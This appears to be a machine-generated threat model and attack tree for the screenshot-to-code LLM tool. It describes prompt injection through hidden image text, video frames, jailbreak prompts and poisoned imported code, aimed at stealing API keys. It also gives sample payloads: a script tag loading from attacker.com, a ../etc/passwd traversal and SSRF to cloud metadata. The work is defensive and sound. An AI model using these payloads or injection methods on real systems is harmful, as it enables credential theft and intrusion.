This is an updated threat model analysis for `screenshot-to-code`. The new findings from the provided project files have been integrated into the existing attack tree.

# Threat Modeling Analysis for screenshot-to-code

## 1. Understand the Project

Project Name: screenshot-to-code

### Overview

`screenshot-to-code` is a tool that leverages Large Language Models (LLMs) to convert visual inputs into functional frontend code. It accepts screenshots, mockups, Figma designs, and even video recordings of web applications, and generates code in various stacks like HTML/Tailwind, React, Vue, and Bootstrap. The project consists of a FastAPI backend that orchestrates calls to external AI services (OpenAI, Anthropic, Gemini, Replicate) and a React/Vite frontend that provides the user interface for uploading inputs and previewing the generated code. Users typically run this application locally, providing their own API keys for the AI services.

### Key Components and Features

-   **Frontend:** A React/Vite single-page application for user interaction.
-   **Backend:** A Python FastAPI server that handles the core logic.
-   **WebSocket Communication:** The frontend and backend communicate over WebSockets for real-time code generation and streaming.
-   **AI Model Integration:** It interfaces with multiple third-party AI APIs (OpenAI for GPT models and DALL-E, Anthropic for Claude, Google for Gemini, Replicate for Flux).
-   **Input Modes:** Supports image, video, and text-based inputs for code generation, including a feature to import existing code for modification.
-   **Code Generation:** Generates code for various frontend frameworks.
-   **URL Screenshotting:** A feature to capture a screenshot of a live URL using the `screenshotone.com` third-party service.
-   **Evaluation System:** Includes scripts and a UI for evaluating the performance of different models and prompts.

### Dependencies

-   **Backend:** `fastapi`, `websockets`, `openai`, `anthropic`, `google-genai`, `httpx`, `moviepy`, `Pillow`.
-   **Frontend:** `react`, `vite`.
-   **External Services:** OpenAI API, Anthropic API, Google Gemini API, Replicate API, screenshotone.com API.

## 2. Define the Root Goal of the Attack Tree

**Attacker's Ultimate Objective:** To execute malicious code on the system of a `screenshot-to-code` user or steal their sensitive data (such as cloud/AI service API keys) by exploiting vulnerabilities in the application's code, its operational logic, or its configuration.

## 3. & 4. High-Level Attack Paths and Expanded Steps

The analysis breaks down the attacker's goal into four primary sub-goals.

### 1. Manipulate AI to Generate Malicious Code

The core function of the application is to trust an AI to generate code. This trust can be abused by crafting inputs that trick the AI into producing malicious code.

-   **1.1 Craft Malicious Input:** An attacker creates an input that appears benign but contains hidden instructions to the LLM.
    -   **1.1.1 Malicious Instructions in Image:** The image contains subtle text, possibly in a color close to the background or in a comment block, instructing the LLM to generate malicious code.
    -   **1.1.2 Malicious Instructions in Video:** A video input contains fleeting frames with malicious text prompts that are processed by the LLM.
    -   **1.1.3 Malicious Text Prompt:** During an "update" iteration, the attacker provides a text prompt that acts as a jailbreak, overriding previous context and instructing the LLM to generate malicious code.
    -   **1.1.4 Malicious Imported Code (System Prompt Injection):** An attacker provides malicious code to the "import code" feature. As seen in `test_prompts.py`, this imported code is embedded directly into the system prompt for subsequent updates, which could poison the LLM's trusted context and more effectively bypass safeguards.
-   **1.2 Malicious Code Payloads:** The resulting generated code could perform various malicious actions.
    -   **1.2.1 Cross-Site Scripting (XSS):** The code contains a script that executes in the frontend's preview pane.
    -   **1.2.2 Remote Script Inclusion:** The code includes a `<script>` tag pointing to an attacker-controlled server (`<script src="http://attacker.com/payload.js"></script>`).
    -   **1.2.3 Data Exfiltration:** The code contains Javascript that reads sensitive information (e.g., from `localStorage`) and sends it to an attacker's server.

### 2. Exploit Insecure Frontend Rendering of Generated Code

This attack path is the direct consequence of a successful "Manipulate AI" attack. The frontend's responsibility is to display the generated code, but if done insecurely, it can execute malicious payloads.

-   **2.1 Execute Code in Preview Pane:** The malicious code generated in Attack Path 1 is loaded into the frontend for the user to preview.
-   **2.2 Steal Secrets from Local Storage:** The frontend stores user-provided API keys in the browser's `localStorage`. A malicious script executing from the preview pane (if not properly sandboxed) can access the `localStorage` of the parent window's origin and steal these keys.
-   **2.3 Hijack User Session:** The malicious script can use the user's authenticated context to perform actions on their behalf, such as making further WebSocket requests to the backend.

### 3. Exploit Backend Service Vulnerabilities

The backend FastAPI server exposes several endpoints that could be targeted by an attacker with network access to the user's machine.

-   **3.1 Path Traversal in Evaluation Endpoints:** The `/evals`, `/pairwise-evals`, and other related endpoints accept a `folder` path from the user. The code joins this path with other filenames, which could allow an attacker to read files outside the intended directories by supplying a crafted path like `../../../../etc/passwd`.
-   **3.2 Server-Side Request Forgery (SSRF) in Screenshot Endpoint:** The `/api/screenshot` endpoint takes a URL, sends it to a third-party service, and returns the resulting image. An attacker could provide an internal network URL (e.g., `http://169.254.169.254/latest/meta-data` on AWS or `http://localhost:8080/internal-dashboard`). The tests in `test_screenshot.py` confirm that local and private IP addresses are considered valid inputs, making this vulnerability highly probable.
-   **3.3 Denial of Service (DoS) via Video Processing:** The video processing logic in `video/utils.py` uses `moviepy` to extract frames from user-uploaded videos. An attacker could submit a crafted video file (e.g., very large, extremely long duration, or a "zip bomb" style compression attack) that exhausts the server's CPU and memory during processing, causing the backend to crash.

### 4. Leverage Insecure Configuration and Environment

The application's setup and configuration can introduce risks, especially related to how it handles API keys and network bindings.

-   **4.1 Redirect API Traffic via Environment Variable Injection:** The application allows overriding the `OPENAI_BASE_URL` via an environment variable. If an attacker can control the user's environment, they can set this variable to a malicious server they control. The backend would then send all OpenAI API requests, including the user's secret API key, to the attacker's server.
-   **4.2 Network Exposure of Local Service:** By default, the application (via Docker or `uvicorn` command) binds to `0.0.0.0`, making it accessible to any device on the same network. If a user runs this on an untrusted network (e.g., public Wi-Fi), an attacker can directly connect to the backend and attempt to exploit other vulnerabilities (like Path Traversal, SSRF, or DoS).

## 5. Visualize the Attack Tree

```
Root Goal: Compromise the screenshot-to-code user's system or steal their secrets

[OR]
+-- 1. Manipulate AI to Generate Malicious Code (Prompt Injection)
|   [AND]
|   +-- 1.1 Craft Malicious Input
|   |   [OR]
|   |   +-- 1.1.1 Craft malicious image with hidden text instructions.
|   |   +-- 1.1.2 Craft malicious video with fleeting instruction frames.
|   |   +-- 1.1.3 Craft malicious text prompt during an 'update' request.
|   |   +-- 1.1.4 Craft malicious code for the "import code" feature to poison the system prompt.
|   +-- 1.2 LLM Generates Malicious Code
|       [OR]
|       +-- 1.2.1 Code contains XSS payload.
|       +-- 1.2.2 Code includes script from attacker's server.
|       +-- 1.2.3 Code contains data exfiltration logic.
|
+-- 2. Exploit Insecure Frontend Rendering of Generated Code
|   [AND]
|   +-- 2.1 Attacker achieves Goal #1 (Malicious Code Generation).
|   +-- 2.2 User previews the generated code in the frontend.
|   +-- 2.3 The preview component (iframe) is not properly sandboxed.
|   +-- 2.4 Malicious script executes in the context of the application's origin.
|       [OR]
|       +-- 2.4.1 Steal API keys from localStorage.
|       +-- 2.4.2 Hijack user's WebSocket session to backend.
|
+-- 3. Exploit Backend Service Vulnerabilities
|   [AND]
|   +-- 3.1 Attacker has network access to the user's machine running the service.
|   +-- 3.2 Exploit a vulnerability
|       [OR]
|       +-- 3.2.1 Path Traversal: Send crafted 'folder' parameter to /evals endpoint to read arbitrary files.
|       +-- 3.2.2 SSRF: Send internal URL to /api/screenshot endpoint to capture internal services.
|       +-- 3.2.3 DoS: Submit a crafted video file to exhaust server resources.
|
+-- 4. Leverage Insecure Configuration and Environment
    [OR]
    +-- 4.1 Redirect API Traffic via Environment Variable Injection
    |   [AND]
    |   +-- 4.1.1 Attacker gains ability to set environment variables on the user's system.
    |   +-- 4.1.2 Attacker sets OPENAI_BASE_URL to a malicious server.
    |   +-- 4.1.3 Backend sends API key and prompts to attacker's server.
    +-- 4.2 Exploit Network Exposure of Local Service
        [AND]
        +-- 4.2.1 User runs the service on an untrusted network (e.g., public Wi-Fi).
        +-- 4.2.2 Service is bound to 0.0.0.0 (default).
        +-- 4.2.3 Attacker on the same network connects to the backend and launches further attacks (e.g., Goal #3).
```

## 6. Assign Attributes to Each Node

| Attack Step | Likelihood | Impact | Effort | Skill Level | Detection Difficulty |
|---|---|---|---|---|---|
| 1. Manipulate AI to Generate Malicious Code | High | High | Medium | Medium | Hard |
| - 1.1.4 Malicious Imported Code | Medium | High | Low | Medium | Hard |
| 2. Exploit Insecure Frontend Rendering | High | High | Low | Low | Medium |
| - 2.2 Steal Secrets from Local Storage | High | High | Low | Low | Medium |
| 3. Exploit Backend Service Vulnerabilities | Medium | High | Low | Low | Medium |
| - 3.1 Path Traversal in Evals Endpoint | Medium | Medium | Low | Low | Medium |
| - 3.2 SSRF in Screenshot Endpoint | **High** | High | Low | Medium | Medium |
| - 3.3 DoS via Video Processing | Medium | Medium | Low | Low | Medium |
| 4. Leverage Insecure Configuration | Low | High | Medium | Low | Hard |
| - 4.1 Redirect API Traffic | Low | High | Medium | Low | Hard |
| - 4.2 Network Exposure of Local Service | High | Medium | Low | Low | Easy |

## 7. Analyze and Prioritize Attack Paths

### High-Risk Paths

1.  **Prompt Injection leading to Credential Theft (Path 1 -> Path 2):** This remains the most significant and realistic threat. An attacker can craft a malicious input (image, text, or imported code) that leads to the generation of code designed to steal API keys from the browser's local storage via an unsandboxed preview pane.
    -   **Justification:** Prompt injection is a notoriously difficult problem. The impact is high as it results in the direct theft of valuable secrets. The "imported code" vector is particularly concerning as it directly manipulates the system prompt.

2.  **SSRF via Screenshot Service (Path 3.2.2):** This is a critical, confirmed vulnerability. An attacker with network access can use the screenshot endpoint to exfiltrate data from internal services or cloud metadata endpoints.
    -   **Justification:** The vulnerability is confirmed by the project's own test files (`test_screenshot.py`), which explicitly allow `localhost` and private IP addresses. The required skill is low, and the potential impact (e.g., stealing cloud infrastructure credentials) is severe. The likelihood is high if the service is exposed on a network.

### Critical Nodes

-   **Frontend Preview Component:** The security of the application against prompt injection hinges on how the generated code is rendered. A securely sandboxed `iframe` is the most critical mitigation for Path 2.
-   **Prompt Construction Logic:** The logic that assembles prompts, especially the feature that embeds imported code into the system prompt, is a critical point for preventing prompt injection.
-   **Backend Input Validation:** The handlers for `/evals`, `/api/screenshot`, and the video upload endpoint are critical nodes for preventing Path Traversal, SSRF, and DoS respectively. They must rigorously validate all user-supplied input.

## 8. Develop Mitigation Strategies

| Threat | Mitigation Strategy |
|---|---|
| **1. Manipulate AI to Generate Malicious Code** | - **Output Sanitization:** Scan the generated code for malicious patterns (e.g., `<script>`, `fetch()`). <br>- **Content Security Policy (CSP):** Implement a strict CSP on the page hosting the preview. <br>- **User Warning:** Alert the user if the generated code contains executable scripts. |
| **1.1.4 Imported Code Prompt Injection** | - **Isolate Untrusted Context:** Do not embed user-provided imported code directly into the system prompt. Instead, pass it as part of the regular user/assistant message history to clearly demarcate it as untrusted input. |
| **2. Exploit Insecure Frontend Rendering** | - **Sandboxed `iframe`:** Render all generated code inside an `<iframe>` with a strict `sandbox` attribute (e.g., `sandbox="allow-scripts"` but without `allow-same-origin`). This is the most critical defense. |
| **3.1 Path Traversal in Evals Endpoint** | - **Input Sanitization:** Normalize and validate the `folder` parameter. Resolve the absolute path and ensure it is a legitimate subdirectory of the intended `EVALS_DIR`. Reject any paths containing `..`. |
| **3.2 SSRF in Screenshot Endpoint** | - **URL Validation:** In `routes/screenshot.py`, implement a strict blocklist for private/reserved IP address ranges (e.g., `127.0.0.0/8`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `169.254.0.0/16`). <br>- **Disable Redirects:** Configure the `httpx` client to not follow redirects. |
| **3.3 DoS via Video Processing** | - **Pre-processing Validation:** Before passing a video to `moviepy`, use a lightweight library to inspect its metadata. Reject files that exceed a reasonable size limit (e.g., 50MB), duration (e.g., 60 seconds), or resolution. |
| **4.1 Redirect API Traffic via Env Var** | - **User Documentation:** Add a warning in the `README.md` about the security implications of setting a custom `OPENAI_BASE_URL`. |
| **4.2 Network Exposure of Local Service** | - **Default to Localhost:** Change the default listen address in `docker-compose.yml` and `README.md` from `0.0.0.0` to `127.0.0.1` (`localhost`). |

## 9. Summarize Findings

### Key Risks Identified

The new files confirm and reinforce the two most critical risks.
1.  **Prompt Injection leading to Credential Theft:** An attacker can use a malicious input (image, text, or now confirmed, imported code) to generate malicious Javascript. If the frontend preview is not securely sandboxed, this code can execute and steal the user's API keys from browser storage.
2.  **Server-Side Request Forgery (SSRF):** The screenshot endpoint is confirmed to be vulnerable, allowing an attacker with network access to the user's machine to take screenshots of internal web services, potentially exposing sensitive data or cloud credentials.

A new, lower-severity risk of **Denial of Service (DoS)** through the video processing endpoint was also identified.

### Recommended Actions

1.  **Implement Secure Rendering:** **(Highest Priority)** Prioritize securing the frontend preview component by rendering all generated code within a maximally sandboxed `iframe`. This is the most effective defense against the primary attack path.
2.  **Harden Backend Endpoints:** Immediately apply strict input validation to the `/api/screenshot` endpoint to block requests to internal/private IP ranges. Also, add input validation to the `/evals` endpoint (for Path Traversal) and the video processing logic (for DoS).
3.  **Change Default Network Binding:** Update the project's documentation and default configuration (`docker-compose.yml`) to bind the backend service to `127.0.0.1` instead of `0.0.0.0` to prevent accidental network exposure.
4.  **Refactor Prompt Construction:** Modify the "import code" feature to treat the imported code as untrusted user history, not part of the trusted system prompt.

## 10. Questions & Assumptions

-   **Assumption:** The frontend stores API keys entered via the UI in `localStorage` or a similar browser storage mechanism accessible via Javascript.
-   **Assumption:** The primary user of this tool is a developer running it on their local machine, which may contain sensitive files and have access to internal company networks.
-   **Question:** How is the generated code currently rendered on the frontend? Is an `iframe` with the `sandbox` attribute already in use? (The provided files do not contain frontend source code to verify this, making this the most critical unknown).
